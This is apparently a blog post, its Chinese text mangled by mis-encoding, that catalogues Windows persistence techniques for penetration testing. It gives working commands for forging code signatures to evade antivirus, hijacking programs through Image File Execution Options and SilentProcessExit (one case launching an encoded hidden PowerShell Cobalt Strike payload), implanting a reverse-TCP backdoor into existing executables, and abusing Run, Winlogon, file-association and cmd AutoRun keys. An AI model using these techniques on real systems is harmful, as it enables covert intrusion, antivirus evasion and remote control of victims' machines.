---
layout:     post
title:      Windows æƒé™ç»´æŒå‡ ç§æ–¹æ³•
subtitle:   ç®€å•æ•´ç†äº†éƒ¨åˆ†æ–¹æ³•
date:       2021-03-02
author:     BY Diego
header-img: https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/090412-1557363852af44.jpg
catalog: true
tags:
    - Windows
    - åŸŸæ¸—é€
    - æ¸—é€æµ‹è¯•
---

### æ•°å­—ç­¾åä¼ªé€ 

https://github.com/secretsquirrel/SigThief

ç»™test.exeä¼ªé€ æ•°å­—ç­¾åï¼Œå¯ä»¥ç»•è¿‡å°‘æ•°æ€æ¯’ç¨‹åº



![image-20210228090612992](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210228090612992.png)



![image-20210228090632864](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210228090632864.png)



ç›®æ ‡ç­¾åexeç¨‹åº éœ€è¦ä¸ç›®æ ‡æœºå™¨ä½æ•°ä¸€è‡´

```shell
python3 sigthief.py -i firefox.exe -t test.exe -o test1.exe
```

![image-20210228090803526](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210228090803526.png)

![image-20210228090701693](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210228090701693.png)



### æ˜ åƒåŠ«æŒ

ä¿®æ”¹æ³¨å†Œè¡¨ï¼ˆç®¡ç†å‘˜æƒé™ï¼‰

```
\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\  
```



æ·»åŠ æƒ³è¦åŠ«æŒçš„exeçš„åç§°ï¼Œå†æ·»åŠ å­—ç¬¦ä¸²å€¼`Debugger` å€¼ä¸º`å¦ä¸€ä¸ªexeçš„è·¯å¾„`

![2C1AD4CBDDD62D08BCEE8EA3A8B23D9F](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/2C1AD4CBDDD62D08BCEE8EA3A8B23D9F.png)



åŠ«æŒåæ•ˆæœ(è¿è¡Œgetpass å®åˆ™æ‰§è¡Œmimikatz)



ä¹Ÿå¯ä½¿ç”¨cmd ä¿®æ”¹æ³¨å†Œè¡¨ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰

```cmd
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\GetPass.exe" /v Debugger /t REG_SZ /d "exeè·¯å¾„"
```

éªŒè¯

```cmd
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\GetPass.exe"
```



<img src="https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/QQ20210301-201559-HD.gif">





å¦ä¸€ç§

**ç¨‹åºç»“æŸå è‡ªåŠ¨æ‰§è¡Œ**

cmd ä¸‹æ‰§è¡Œ

Aç¨‹åºä¸ºæ­£å¸¸è¿è¡Œçš„ï¼ŒBä¸ºAé€€å‡ºåè¿è¡Œ

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\A.exe" /v GlobalFlag /t REG_DWORD /d 512

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\A.exe" /v ReportingMode /t REG_DWORD /d 1

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\A.exe" /v MonitorProcess /t REG_SZ /d "B.exeè·¯å¾„"
```



![image-20210228165027832](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210228165027832.png)



æ•ˆæœå¦‚ä¸‹

<img src="https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/QQ20210228-165413.gif">



cs

ç”Ÿæˆpayload

![image-20210228211005608](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210228211005608.png)



![image-20210228211034924](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210228211034924.png)



ä¸Šé¢æŠŠ`B.exeè·¯å¾„`æ”¹ä¸º payloadå³å¯

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\A.exe" /v MonitorProcess /t REG_SZ
/d "powershell.exe -nop -w hidden -encodedcommandJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwA........"
```

å¯åŠ¨A.exe ç„¶åé€€å‡º

![image-20210228211300478](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210228211300478.png)



### éšè—åé—¨

é¡¹ç›®åœ°å€

https://github.com/secretsquirrel/the-backdoor-factory



å°†åé—¨å†™å…¥å·²å­˜åœ¨çš„exeç¨‹åº



åˆ¤æ–­ç›®æ ‡exeæ˜¯å¦æ”¯æŒå†™å…¥æœ¨é©¬

```bash
 python backdoor.py -f ç›®æ ‡exe -S
```

![image-20210301160011364](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210301160011364.png)



æŸ¥çœ‹å¯ç”¨payload

```
 python backdoor.py -f ç›®æ ‡exe show
```



![image-20210301160222893](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210301160222893.png)



å†™å…¥åå‘é“¾æ¥çš„ğŸ

```bash
python backdoor.py -f ç›®æ ‡.exe -s iat_reverse_tcp_stager_threaded  -P 8888 -H vpsçš„ipåœ°å€
```



é€‰æ‹©å¯å†™å…¥çš„å—åºå·

![image-20210301160550627](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210301160550627.png)



![image-20210301160647376](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210301160647376.png)



ç”Ÿçš„æœ¨é©¬åœ¨ backdoored ç›®å½•ä¸‹

Kali msfç›‘å¬ ç¨‹åºæ‰§è¡Œåå¼€å§‹åå¼¹ ï¼Œç¨‹åºå…³é—­ä¹‹å åå¼¹å›æ¥çš„shellä¹Ÿä¼šéšä¹‹å…³é—­

<img src="https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/2.gif">



åœ¨çº¿æŸ¥æ€ åªæœ‰10ä¸ªæŠ¥æ¯’

![image-20210301162143748](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210301162143748.png)



### è‡ªå¯åŠ¨

```
HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows
```

æ·»åŠ loadå­—ç¬¦ä¸² ï¼Œæ–‡ä»¶è·¯å¾„ç”¨çŸ­æ–‡ä»¶è·¯å¾„(æˆ–è€…æ·»åŠ run å­—ç¬¦ä¸²)

![image-20210301171831947](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210301171831947.png)



```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

å¾€`userinit` è¿½åŠ æ•°æ® ç”¨é€—å·åˆ†éš”å¯ä»¥æ‰§è¡Œå¤šç¨‹åº

![image-20210301172446498](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210301172446498.png)



```
\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce
```

runonce åªæ‰§è¡Œä¸€æ¬¡ æ³¨å†Œè¡¨ä¿¡æ¯è‡ªåŠ¨æ¶ˆå¤±

![image-20210301184422159](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210301184422159.png)



```
\HKEY_CURRENT_USER\Environment
```

æ·»åŠ `UserInitMprLogonScript`å­—ç¬¦ä¸²

![image-20210301185348488](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210301185348488.png)



### ä¿®æ”¹æ–‡ä»¶å…³è”æ³¨å†Œè¡¨

```
exeå…³è”  HKEY_CLASSES_ROOT\exefile\shell\open\command
```

å°†é»˜è®¤`"%1" %*` æ”¹ä¸º 	`æ¶æ„exe "%1" %*`

ä¿®æ”¹ä¹‹åæ‰“å¼€ä»»æ„exe éƒ½ä¼šå¯åŠ¨æ¶æ„exe

![image-20210301213011691](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210301213011691.png)



<img src="https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/QQ20210301-213346-HD.gif">



txtå…³è”æ–‡ä»¶ 

```
HKEY_CLASSES_ROOT\txtfile\shell\open\command
```

ä¸€èˆ¬æƒ…å†µä¸º

```
HKEY_CLASSES_ROOT\åç¼€+file\shell\open\command
```



### è·Ÿéšcmdè‡ªå¯åŠ¨

æŒ‡å®šcmdå¯åŠ¨æ—¶åŠ è½½çš„vbsè„šæœ¬

```
\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor
```

æ·»åŠ å­—ç¬¦ä¸² é”®`AutoRun` 

![image-20210302082559420](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/image-20210302082559420.png)

<img src="https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/QQ20210302-082710-HD-3.gif">

